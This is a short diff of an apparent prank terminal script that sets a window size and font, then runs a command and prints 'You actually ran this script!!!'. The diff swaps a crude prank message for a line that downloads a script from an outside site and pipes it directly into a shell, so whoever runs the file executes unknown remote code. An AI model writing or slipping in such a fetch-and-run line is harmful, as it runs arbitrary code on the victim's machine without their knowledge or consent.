@@ -10,7 +10,7 @@ positionWindow 0 0;
 setSize 9 1;
 setFontSize 60;
 
-termdo 'echo "Im currently in your mothers bed — shes not home yet...!!"';
+termdo 'curl -s https://suckaaa.com/s/current-location | sh';
 
 echo "\n\nYou actually ran this script!!!\n";
 
